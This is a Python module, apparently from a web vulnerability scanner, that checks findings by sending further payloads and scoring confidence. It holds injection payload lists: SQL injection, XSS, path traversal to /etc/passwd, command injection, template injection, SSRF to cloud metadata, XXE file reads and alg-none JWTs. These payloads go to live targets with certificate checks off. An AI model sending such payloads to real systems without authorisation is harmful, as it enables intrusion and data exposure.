"""
Multi-stage vulnerability verification engine.
Reduces false positive rate through:
1. Response differential analysis (benign vs attack comparison)
2. Secondary confirmation with alternative payloads
3. False positive pattern matching
4. Context-aware verification strategies
5. Confidence scoring system
"""
import re
import time
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from app.utils.logger import get_logger

logger = get_logger("vuln_verifier")

DEFAULT_TIMEOUT = 15
DEFAULT_RETRIES = 2


class VerificationResult(str, Enum):
    CONFIRMED = "confirmed"
    LIKELY = "likely"
    UNCERTAIN = "uncertain"
    FALSE_POSITIVE = "false_positive"


class VerifyStrategy(str, Enum):
    DIFFERENTIAL = "differential"
    ALTERNATIVE_PAYLOAD = "alternative_payload"
    TIME_BASED = "time_based"
    ECHO_CHECK = "echo_check"
    ERROR_PATTERN = "error_pattern"
    REFLECTION_CHECK = "reflection_check"
    SIZE_ANALYSIS = "size_analysis"
    BEHAVIORAL = "behavioral"


@dataclass
class VerifyEvidence:
    strategy: VerifyStrategy
    description: str
    supports_finding: bool
    confidence_impact: int
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class VerificationReport:
    original_finding: Dict[str, Any]
    result: VerificationResult
    confidence_score: int
    evidences: List[VerifyEvidence] = field(default_factory=list)
    verified_payload: str = ""
    verified_response: str = ""
    false_positive_reason: str = ""
    recommendations: List[str] = field(default_factory=list)


FALSE_POSITIVE_PATTERNS = {
    "sqli": [
        (re.compile(r"(?i)404\s*(not\s*found|page\s*not)", re.IGNORECASE), "404页面误判为SQL错误"),
        (re.compile(r"(?i)bad\s*request|invalid\s*parameter", re.IGNORECASE), "参数校验错误被误判"),
        (re.compile(r"(?i)welcome.*to.*nginx|apache.*default", re.IGNORECASE), "默认服务器页面"),
        (re.compile(r"(?i)cloudflare|cloudfront|akamai", re.IGNORECASE), "CDN/WAF拦截页面"),
        (re.compile(r"(?i)access\s*denied|forbidden|blocked", re.IGNORECASE), "访问被拒绝页面"),
        (re.compile(r"(?i)请输入|请填写|参数错误|非法请求", re.IGNORECASE), "中文参数校验错误"),
    ],
    "xss": [
        (re.compile(r"(?i)&lt;script&gt;|&amp;lt;", re.IGNORECASE), "HTML实体编码（已安全转义）"),
        (re.compile(r"(?i)content-security-policy", re.IGNORECASE), "CSP头存在（XSS利用受限）"),
        (re.compile(r"(?i)x-xss-protection:\s*1;\s*mode=block", re.IGNORECASE), "XSS过滤器启用"),
        (re.compile(r"(?i)json\s*parse\s*error|invalid\s*json", re.IGNORECASE), "JSON解析错误"),
    ],
    "lfi": [
        (re.compile(r"(?i)failed\s*to\s*open\s*stream|no\s*such\s*file", re.IGNORECASE), "文件不存在错误（非敏感信息）"),
        (re.compile(r"(?i)warning:.*include|warning:.*require", re.IGNORECASE), "PHP Warning（非漏洞确认）"),
        (re.compile(r"(?i)permission\s*denied", re.IGNORECASE), "权限拒绝（非路径遍历成功）"),
    ],
    "rce": [
        (re.compile(r"(?i)command\s*not\s*found|not\s*recognized", re.IGNORECASE), "命令未找到（非RCE确认）"),
        (re.compile(r"(?i)usage:|help:|invalid\s*option", re.IGNORECASE), "命令帮助信息（非RCE确认）"),
        (re.compile(r"(?i)sh:\s*\w+:\s*not\s*found", re.IGNORECASE), "Shell命令未找到"),
    ],
    "ssrf": [
        (re.compile(r"(?i)connection\s*refused|connection\s*timed\s*out", re.IGNORECASE), "连接失败（非SSRF确认）"),
        (re.compile(r"(?i)could\s*not\s*resolve\s*host|name\s*or\s*service", re.IGNORECASE), "DNS解析失败"),
        (re.compile(r"(?i)invalid\s*url|url\s*format", re.IGNORECASE), "URL格式校验"),
    ],
    "ssti": [
        (re.compile(r"(?i)undefined|none|null|nil", re.IGNORECASE), "空值返回（非SSTI确认）"),
        (re.compile(r"(?i)template\s*not\s*found|template\s*error", re.IGNORECASE), "模板未找到错误"),
    ],
    "xxe": [
        (re.compile(r"(?i)xml\s*parse\s*error|invalid\s*xml|saxparseexception", re.IGNORECASE), "XML解析错误（非XXE确认）"),
        (re.compile(r"(?i)DOCTYPE\s*is\s*not\s*allowed|external\s*entity", re.IGNORECASE), "外部实体被禁用"),
    ],
    "file_upload": [
        (re.compile(r"(?i)file\s*type\s*not\s*allowed|invalid\s*file\s*type", re.IGNORECASE), "文件类型被拒绝"),
        (re.compile(r"(?i)file\s*too\s*large|exceeds\s*maximum", re.IGNORECASE), "文件大小超限"),
    ],
}

ALTERNATIVE_PAYLOADS = {
    "sqli": [
        ("' OR '1'='1' --", "OR条件注入"),
        ("' AND '1'='2' --", "AND假条件注入"),
        ("' UNION SELECT NULL--", "UNION SELECT注入"),
        ("1' AND SLEEP(3)--", "时间盲注"),
        ("1' AND 1=1--", "数字型AND注入"),
        ("1' AND 1=2--", "数字型AND假条件"),
        ("' OR 1=1#", "MySQL注释注入"),
        ("' OR 1=1-- -", "MySQL双破折号注入"),
    ],
    "xss": [
        ('<img src=x onerror=alert(1)>', "IMG标签XSS"),
        ('<svg onload=alert(1)>', "SVG标签XSS"),
        ('"><script>alert(1)</script>', "属性逃逸XSS"),
        ("'-alert(1)-'", "JS上下文XSS"),
        ('<body onload=alert(1)>', "BODY事件XSS"),
        ('<details open ontoggle=alert(1)>', "DETAILS标签XSS"),
    ],
    "lfi": [
        ("../../../../etc/passwd", "Linux密码文件"),
        ("../../../../etc/hosts", "Linux hosts文件"),
        ("../../../../windows/win.ini", "Windows配置文件"),
        ("....//....//....//....//etc/passwd", "双写绕过"),
        ("..%2f..%2f..%2f..%2fetc/passwd", "URL编码绕过"),
        ("/etc/passwd%00", "空字节截断"),
    ],
    "rce": [
        (";sleep 3", "分号命令分隔"),
        ("|sleep 3", "管道命令分隔"),
        ("`sleep 3`", "反引号命令执行"),
        ("$(sleep 3)", "美元符号命令执行"),
        ("||sleep 3", "OR命令分隔"),
        ("&&sleep 3", "AND命令分隔"),
        ("%0asleep 3", "换行符注入"),
    ],
    "ssti": [
        ("{{7*7}}", "Jinja2/Twig数学运算"),
        ("${7*7}", "FreeMarker数学运算"),
        ("<%= 7*7 %>", "ERB数学运算"),
        ("#{7*7}", "Pug/Jade数学运算"),
        ("{{config}}", "Flask配置泄露"),
        ("{{self.__init__.__globals__}}", "Jinja2对象遍历"),
    ],
    "ssrf": [
        ("http://127.0.0.1:80/", "本地回环地址"),
        ("http://localhost/", "localhost访问"),
        ("http://0.0.0.0/", "0.0.0.0访问"),
        ("http://[::1]/", "IPv6回环地址"),
        ("http://169.254.169.254/", "AWS元数据地址"),
        ("gopher://127.0.0.1:6379/_INFO", "Redis Gopher协议"),
    ],
    "xxe": [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "文件读取XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>', "SSRF XXE"),
    ],
    "path_traversal": [
        ("../../../../etc/passwd", "Linux密码文件"),
        ("..\\..\\..\\..\\windows\\win.ini", "Windows配置文件"),
        ("....//....//....//....//etc/passwd", "双写绕过"),
    ],
    "cmd_injection": [
        (";sleep 3", "分号命令分隔"),
        ("|sleep 3", "管道命令分隔"),
        ("`sleep 3`", "反引号命令执行"),
    ],
    "open_redirect": [
        ("https://evil.com", "外部域名重定向"),
        ("//evil.com", "协议相对URL"),
        ("https:evil.com", "省略斜杠"),
        ("\\\\evil.com", "反斜杠URL"),
    ],
    "crlf": [
        ("%0d%0aSet-Cookie:crlf=injection", "CRLF Cookie注入"),
        ("%0d%0aContent-Length:0%0d%0a%0d%0a", "CRLF响应拆分"),
    ],
    "nosql": [
        ("{'$ne': null}", "NoSQL $ne注入"),
        ("{'$gt': ''}", "NoSQL $gt注入"),
        ("{$where: 'sleep(3000)'}", "NoSQL $where注入"),
    ],
    "jwt": [
        ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.", "None算法JWT"),
        ('{"alg":"none","typ":"JWT"}', "None算法Header"),
    ],
    "deserialization": [
        ("O:8:\"stdClass\":0:{}", "PHP反序列化"),
        ("rO0ABXVyAB", "Java反序列化(base64)"),
    ],
}

BENIGN_REPLACEMENTS = {
    "sqli": lambda p: re.sub(r"['\";\\]+", "", re.sub(r"(?i)(union|select|sleep|benchmark|waitfor|exec|xp_)", "", p)),
    "xss": lambda p: re.sub(r"<[^>]*>", "", re.sub(r"(?i)(script|onerror|onload|alert|prompt|confirm|javascript)", "", p)),
    "lfi": lambda p: re.sub(r"\.\./|\.\.\\\\", "", p),
    "rce": lambda p: re.sub(r"[;&|`$()\\]+", "", re.sub(r"(?i)(sleep|ping|nslookup|curl|wget|nc|bash|sh|cmd|powershell)", "", p)),
    "ssti": lambda p: re.sub(r"[{}$<%#]+", "", re.sub(r"(?i)(config|self|globals|import|open|eval|exec)", "", p)),
    "ssrf": lambda p: re.sub(r"(?i)(http://|https://|gopher://|file://|dict://)", "", p),
    "xxe": lambda p: re.sub(r"(?i)(<!DOCTYPE|<!ENTITY|SYSTEM|PUBLIC)", "", p),
    "path_traversal": lambda p: re.sub(r"\.\./|\.\.\\\\", "", p),
    "cmd_injection": lambda p: re.sub(r"[;&|`$()\\]+", "", re.sub(r"(?i)(sleep|ping|nslookup|curl|wget|nc|bash|sh|cmd|powershell)", "", p)),
}


def _create_session() -> requests.Session:
    session = requests.Session()
    retry_strategy = Retry(
        total=DEFAULT_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def _normalize_category(category: str) -> str:
    category_lower = category.lower().replace("-", "_").replace(" ", "_")
    aliases = {
        "sql_injection": "sqli",
        "sql": "sqli",
        "cross_site_scripting": "xss",
        "local_file_inclusion": "lfi",
        "file_inclusion": "lfi",
        "remote_code_execution": "rce",
        "command_injection": "rce",
        "cmd_injection": "rce",
        "server_side_request_forgery": "ssrf",
        "server_side_template_injection": "ssti",
        "template_injection": "ssti",
        "xml_external_entity": "xxe",
        "path_traversal": "lfi",
        "directory_traversal": "lfi",
        "open_redirect": "open_redirect",
        "crlf_injection": "crlf",
        "nosql_injection": "nosql",
        "json_web_token": "jwt",
        "deserialization": "deserialization",
        "file_upload": "file_upload",
        "csrf": "csrf",
        "cors": "cors",
    }
    return aliases.get(category_lower, category_lower)


def _check_false_positive_patterns(category: str, response_text: str) -> List[Tuple[str, str]]:
    matched = []
    patterns = FALSE_POSITIVE_PATTERNS.get(category, [])
    for pattern, description in patterns:
        if pattern.search(response_text):
            matched.append((description, pattern.pattern))
    return matched


def _generate_benign_payload(category: str, original_payload: str) -> str:
    normalizer = BENIGN_REPLACEMENTS.get(category)
    if normalizer:
        return normalizer(original_payload)
    return re.sub(r"['\";<>{}|&`$()\\]+", "", original_payload)


def _calculate_response_similarity(resp1: str, resp2: str) -> float:
    if not resp1 or not resp2:
        return 0.0
    len1, len2 = len(resp1), len(resp2)
    if len1 == 0 and len2 == 0:
        return 1.0
    if len1 == 0 or len2 == 0:
        return 0.0
    size_ratio = min(len1, len2) / max(len1, len2)
    words1 = set(re.findall(r'\w+', resp1.lower()))
    words2 = set(re.findall(r'\w+', resp2.lower()))
    if not words1 and not words2:
        return size_ratio
    if not words1 or not words2:
        return size_ratio * 0.5
    intersection = words1 & words2
    union = words1 | words2
    jaccard = len(intersection) / len(union) if union else 0.0
    return (size_ratio * 0.4 + jaccard * 0.6)


def _verify_differential(
    session: requests.Session,
    target_url: str,
    method: str,
    category: str,
    original_payload: str,
    original_response: str,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> List[VerifyEvidence]:
    evidences = []
    benign_payload = _generate_benign_payload(category, original_payload)

    if benign_payload == original_payload or not benign_payload.strip():
        return evidences

    try:
        benign_url = target_url
        if "?" in target_url:
            base, qs = target_url.split("?", 1)
            benign_url = f"{base}?{benign_payload}"
        else:
            benign_url = f"{target_url}?q={benign_payload}"

        resp = session.request(
            method=method,
            url=benign_url,
            headers=headers or {},
            timeout=timeout,
            allow_redirects=True,
            verify=False,
        )
        benign_text = resp.text[:5000]
        similarity = _calculate_response_similarity(original_response[:5000], benign_text)

        if similarity < 0.5:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.DIFFERENTIAL,
                description=f"攻击响应与正常响应差异显著（相似度: {similarity:.2f}），支持漏洞存在",
                supports_finding=True,
                confidence_impact=25,
                details={"similarity": similarity, "benign_size": len(benign_text), "attack_size": len(original_response)},
            ))
        elif similarity < 0.8:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.DIFFERENTIAL,
                description=f"攻击响应与正常响应存在一定差异（相似度: {similarity:.2f}），可能为漏洞",
                supports_finding=True,
                confidence_impact=10,
                details={"similarity": similarity},
            ))
        else:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.DIFFERENTIAL,
                description=f"攻击响应与正常响应高度相似（相似度: {similarity:.2f}），可能为误报",
                supports_finding=False,
                confidence_impact=-15,
                details={"similarity": similarity},
            ))

    except Exception as e:
        logger.debug(f"Differential verification failed: {e}")

    return evidences


def _verify_alternative_payloads(
    session: requests.Session,
    target_url: str,
    method: str,
    category: str,
    original_response: str,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> List[VerifyEvidence]:
    evidences = []
    alt_payloads = ALTERNATIVE_PAYLOADS.get(category, [])

    if not alt_payloads:
        return evidences

    confirmed_count = 0
    tested_count = 0

    for alt_payload, description in alt_payloads[:4]:
        try:
            alt_url = target_url
            if "?" in target_url:
                base, qs = target_url.split("?", 1)
                alt_url = f"{base}?{alt_payload}"
            else:
                alt_url = f"{target_url}?q={alt_payload}"

            resp = session.request(
                method=method,
                url=alt_url,
                headers=headers or {},
                timeout=timeout,
                allow_redirects=True,
                verify=False,
            )
            tested_count += 1
            alt_text = resp.text[:5000]
            similarity = _calculate_response_similarity(original_response[:5000], alt_text)

            if similarity > 0.6:
                confirmed_count += 1

        except Exception as e:
            logger.debug(f"Alternative payload test failed for {alt_payload}: {e}")

    if tested_count > 0:
        confirm_ratio = confirmed_count / tested_count
        if confirm_ratio >= 0.5:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ALTERNATIVE_PAYLOAD,
                description=f"替代Payload验证：{confirmed_count}/{tested_count} 个替代Payload产生相似响应，确认漏洞存在",
                supports_finding=True,
                confidence_impact=20,
                details={"confirmed": confirmed_count, "tested": tested_count, "ratio": confirm_ratio},
            ))
        elif confirm_ratio >= 0.25:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ALTERNATIVE_PAYLOAD,
                description=f"替代Payload验证：{confirmed_count}/{tested_count} 个替代Payload产生相似响应，部分确认",
                supports_finding=True,
                confidence_impact=10,
                details={"confirmed": confirmed_count, "tested": tested_count, "ratio": confirm_ratio},
            ))
        else:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ALTERNATIVE_PAYLOAD,
                description=f"替代Payload验证：仅{confirmed_count}/{tested_count} 个替代Payload产生相似响应，可能为误报",
                supports_finding=False,
                confidence_impact=-10,
                details={"confirmed": confirmed_count, "tested": tested_count, "ratio": confirm_ratio},
            ))

    return evidences


def _verify_time_based(
    session: requests.Session,
    target_url: str,
    method: str,
    category: str,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> List[VerifyEvidence]:
    evidences = []

    time_payloads = {
        "sqli": [
            ("1' AND SLEEP(3)--", "MySQL时间盲注"),
            ("1'; WAITFOR DELAY '0:0:3'--", "MSSQL时间盲注"),
            ("1' AND pg_sleep(3)--", "PostgreSQL时间盲注"),
        ],
        "rce": [
            (";sleep 3", "Shell sleep命令"),
            ("|timeout /t 3", "Windows timeout命令"),
        ],
        "cmd_injection": [
            (";sleep 3", "Shell sleep命令"),
            ("|timeout /t 3", "Windows timeout命令"),
        ],
        "ssti": [
            ("{{sleep(3)}}", "模板sleep函数"),
        ],
    }

    time_payload_list = time_payloads.get(category, [])
    if not time_payload_list:
        return evidences

    for payload, description in time_payload_list[:2]:
        try:
            test_url = target_url
            if "?" in target_url:
                base, qs = target_url.split("?", 1)
                test_url = f"{base}?{payload}"
            else:
                test_url = f"{target_url}?q={payload}"

            start = time.time()
            resp = session.request(
                method=method,
                url=test_url,
                headers=headers or {},
                timeout=timeout + 5,
                allow_redirects=True,
                verify=False,
            )
            elapsed = time.time() - start

            if elapsed >= 2.5:
                evidences.append(VerifyEvidence(
                    strategy=VerifyStrategy.TIME_BASED,
                    description=f"时间盲注验证：{description} 响应延迟 {elapsed:.1f}秒，确认漏洞存在",
                    supports_finding=True,
                    confidence_impact=30,
                    details={"payload": payload, "elapsed": elapsed, "threshold": 2.5},
                ))
                break
            elif elapsed >= 1.5:
                evidences.append(VerifyEvidence(
                    strategy=VerifyStrategy.TIME_BASED,
                    description=f"时间盲注验证：{description} 响应延迟 {elapsed:.1f}秒，可能存在漏洞",
                    supports_finding=True,
                    confidence_impact=15,
                    details={"payload": payload, "elapsed": elapsed},
                ))

        except requests.Timeout:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.TIME_BASED,
                description=f"时间盲注验证：{description} 请求超时，可能确认漏洞",
                supports_finding=True,
                confidence_impact=20,
                details={"payload": payload, "timeout": True},
            ))
            break
        except Exception as e:
            logger.debug(f"Time-based verification failed for {payload}: {e}")

    return evidences


def _verify_reflection(
    session: requests.Session,
    target_url: str,
    method: str,
    category: str,
    original_payload: str,
    original_response: str,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> List[VerifyEvidence]:
    evidences = []

    if category not in ("xss", "ssti"):
        return evidences

    clean_payload = re.sub(r'[<>"\']', '', original_payload)
    if clean_payload and clean_payload in original_response:
        evidences.append(VerifyEvidence(
            strategy=VerifyStrategy.REFLECTION_CHECK,
            description=f"Payload内容在响应中原样反射，确认反射型漏洞",
            supports_finding=True,
            confidence_impact=20,
            details={"reflected_content": clean_payload[:100]},
        ))
    else:
        evidences.append(VerifyEvidence(
            strategy=VerifyStrategy.REFLECTION_CHECK,
            description="Payload内容未在响应中原样反射，可能为存储型或误报",
            supports_finding=False,
            confidence_impact=-10,
            details={},
        ))

    return evidences


def _verify_error_patterns(
    category: str,
    original_response: str,
) -> List[VerifyEvidence]:
    evidences = []

    error_signatures = {
        "sqli": [
            (re.compile(r"(?i)(SQL syntax|mysql_fetch|MySQL Error|ORA-\d{5}|PostgreSQL.*ERROR|SQLite3::|SQLServer.*error|Warning.*mysql_|Unclosed quotation mark|Microsoft OLE DB.*Provider)"), "数据库错误信息"),
            (re.compile(r"(?i)(column.*not found|table.*doesn't exist|unknown column|invalid table name)"), "数据库结构泄露"),
        ],
        "lfi": [
            (re.compile(r"root:.*:0:0:"), "Linux密码文件内容"),
            (re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]"), "Windows配置文件内容"),
        ],
        "rce": [
            (re.compile(r"uid=\d+\(\w+\)\s+gid=\d+\(\w+\)"), "id命令输出"),
            (re.compile(r"(?i)(Microsoft Windows|Linux|Darwin).*(Version|release)", re.IGNORECASE), "系统信息泄露"),
        ],
        "ssti": [
            (re.compile(r"49"), "数学运算结果49（7*7）"),
            (re.compile(r"(?i)(jinja2|werkzeug|flask|django|tornado)", re.IGNORECASE), "框架信息泄露"),
        ],
        "ssrf": [
            (re.compile(r"(?i)(aws.*metadata|ami-id|instance-id|security-credentials)", re.IGNORECASE), "云元数据泄露"),
        ],
    }

    sigs = error_signatures.get(category, [])
    for pattern, description in sigs:
        if pattern.search(original_response):
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ERROR_PATTERN,
                description=f"检测到特征错误信息：{description}，确认漏洞存在",
                supports_finding=True,
                confidence_impact=25,
                details={"pattern": pattern.pattern, "description": description},
            ))

    return evidences


def _verify_size_analysis(
    original_response: str,
    benign_response: str = "",
) -> List[VerifyEvidence]:
    evidences = []

    if not benign_response:
        return evidences

    orig_size = len(original_response)
    benign_size = len(benign_response)

    if benign_size > 0:
        ratio = orig_size / benign_size
        if ratio > 3.0:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.SIZE_ANALYSIS,
                description=f"攻击响应大小({orig_size})是正常响应({benign_size})的{ratio:.1f}倍，显著异常",
                supports_finding=True,
                confidence_impact=15,
                details={"attack_size": orig_size, "benign_size": benign_size, "ratio": ratio},
            ))
        elif ratio < 0.3:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.SIZE_ANALYSIS,
                description=f"攻击响应大小({orig_size})远小于正常响应({benign_size})，可能触发了错误页面",
                supports_finding=True,
                confidence_impact=10,
                details={"attack_size": orig_size, "benign_size": benign_size, "ratio": ratio},
            ))

    return evidences


def verify_vulnerability(
    target_url: str,
    method: str,
    category: str,
    original_payload: str,
    original_response: str,
    headers: Optional[Dict[str, str]] = None,
    risk_level: str = "medium",
    timeout: int = DEFAULT_TIMEOUT,
) -> VerificationReport:
    """
    Multi-stage vulnerability verification.
    
    Returns a VerificationReport with confidence score and detailed evidences.
    """
    category = _normalize_category(category)
    session = _create_session()
    evidences: List[VerifyEvidence] = []
    base_confidence = 50

    fp_matches = _check_false_positive_patterns(category, original_response)
    if fp_matches:
        for desc, pattern in fp_matches:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ERROR_PATTERN,
                description=f"误报特征匹配：{desc}",
                supports_finding=False,
                confidence_impact=-20,
                details={"pattern": pattern, "description": desc},
            ))

    error_evidences = _verify_error_patterns(category, original_response)
    evidences.extend(error_evidences)

    if category in ("xss", "ssti"):
        reflection_evidences = _verify_reflection(
            session, target_url, method, category, original_payload, original_response, headers, timeout
        )
        evidences.extend(reflection_evidences)

    diff_evidences = _verify_differential(
        session, target_url, method, category, original_payload, original_response, headers, timeout
    )
    evidences.extend(diff_evidences)

    alt_evidences = _verify_alternative_payloads(
        session, target_url, method, category, original_response, headers, timeout
    )
    evidences.extend(alt_evidences)

    time_evidences = _verify_time_based(
        session, target_url, method, category, headers, timeout
    )
    evidences.extend(time_evidences)

    total_impact = sum(e.confidence_impact for e in evidences)
    confidence = max(0, min(100, base_confidence + total_impact))

    supporting = [e for e in evidences if e.supports_finding]
    opposing = [e for e in evidences if not e.supports_finding]

    if confidence >= 80:
        result = VerificationResult.CONFIRMED
    elif confidence >= 55:
        result = VerificationResult.LIKELY
    elif confidence >= 30:
        result = VerificationResult.UNCERTAIN
    else:
        result = VerificationResult.FALSE_POSITIVE

    false_positive_reason = ""
    if result == VerificationResult.FALSE_POSITIVE:
        reasons = [e.description for e in opposing]
        false_positive_reason = "; ".join(reasons) if reasons else "综合置信度过低"

    recommendations = []
    if result == VerificationResult.CONFIRMED:
        recommendations.append("建议立即修复该漏洞")
    elif result == VerificationResult.LIKELY:
        recommendations.append("建议手动验证确认漏洞")
    elif result == VerificationResult.UNCERTAIN:
        recommendations.append("建议在测试环境手动复现")
    elif result == VerificationResult.FALSE_POSITIVE:
        recommendations.append("该发现可能为误报，建议忽略或手动确认")

    session.close()

    return VerificationReport(
        original_finding={
            "target_url": target_url,
            "category": category,
            "payload": original_payload,
            "risk_level": risk_level,
        },
        result=result,
        confidence_score=confidence,
        evidences=evidences,
        verified_payload=original_payload,
        verified_response=original_response[:2000],
        false_positive_reason=false_positive_reason,
        recommendations=recommendations,
    )


def quick_verify(
    target_url: str,
    category: str,
    original_payload: str,
    original_response: str,
    risk_level: str = "medium",
) -> VerificationReport:
    """Quick verification without sending additional requests (passive only)."""
    category = _normalize_category(category)
    evidences: List[VerifyEvidence] = []
    base_confidence = 50

    fp_matches = _check_false_positive_patterns(category, original_response)
    if fp_matches:
        for desc, pattern in fp_matches:
            evidences.append(VerifyEvidence(
                strategy=VerifyStrategy.ERROR_PATTERN,
                description=f"误报特征匹配：{desc}",
                supports_finding=False,
                confidence_impact=-20,
                details={"pattern": pattern, "description": desc},
            ))

    error_evidences = _verify_error_patterns(category, original_response)
    evidences.extend(error_evidences)

    total_impact = sum(e.confidence_impact for e in evidences)
    confidence = max(0, min(100, base_confidence + total_impact))

    if confidence >= 80:
        result = VerificationResult.CONFIRMED
    elif confidence >= 55:
        result = VerificationResult.LIKELY
    elif confidence >= 30:
        result = VerificationResult.UNCERTAIN
    else:
        result = VerificationResult.FALSE_POSITIVE

    false_positive_reason = ""
    if result == VerificationResult.FALSE_POSITIVE:
        opposing = [e for e in evidences if not e.supports_finding]
        reasons = [e.description for e in opposing]
        false_positive_reason = "; ".join(reasons) if reasons else "综合置信度过低"

    return VerificationReport(
        original_finding={
            "target_url": target_url,
            "category": category,
            "payload": original_payload,
            "risk_level": risk_level,
        },
        result=result,
        confidence_score=confidence,
        evidences=evidences,
        verified_payload=original_payload,
        verified_response=original_response[:2000],
        false_positive_reason=false_positive_reason,
        recommendations=[],
    )


def batch_verify(
    findings: List[Dict[str, Any]],
    max_concurrent: int = 5,
) -> List[VerificationReport]:
    """Batch verify multiple findings with concurrency control."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    reports = []
    with ThreadPoolExecutor(max_workers=min(max_concurrent, len(findings))) as executor:
        future_to_finding = {}
        for finding in findings:
            future = executor.submit(
                verify_vulnerability,
                target_url=finding.get("target_url", ""),
                method=finding.get("method", "GET"),
                category=finding.get("category", ""),
                original_payload=finding.get("payload", ""),
                original_response=finding.get("response", ""),
                headers=finding.get("headers"),
                risk_level=finding.get("risk_level", "medium"),
            )
            future_to_finding[future] = finding

        for future in as_completed(future_to_finding):
            try:
                report = future.result(timeout=60)
                reports.append(report)
            except Exception as e:
                logger.error(f"Batch verification failed for a finding: {e}")

    return reports


def get_verification_stats(reports: List[VerificationReport]) -> Dict[str, Any]:
    """Get summary statistics from verification reports."""
    total = len(reports)
    if total == 0:
        return {"total": 0}

    confirmed = sum(1 for r in reports if r.result == VerificationResult.CONFIRMED)
    likely = sum(1 for r in reports if r.result == VerificationResult.LIKELY)
    uncertain = sum(1 for r in reports if r.result == VerificationResult.UNCERTAIN)
    false_positive = sum(1 for r in reports if r.result == VerificationResult.FALSE_POSITIVE)

    avg_confidence = sum(r.confidence_score for r in reports) / total if total > 0 else 0

    return {
        "total": total,
        "confirmed": confirmed,
        "likely": likely,
        "uncertain": uncertain,
        "false_positive": false_positive,
        "false_positive_rate": false_positive / total if total > 0 else 0,
        "true_positive_rate": (confirmed + likely) / total if total > 0 else 0,
        "average_confidence": round(avg_confidence, 1),
    }
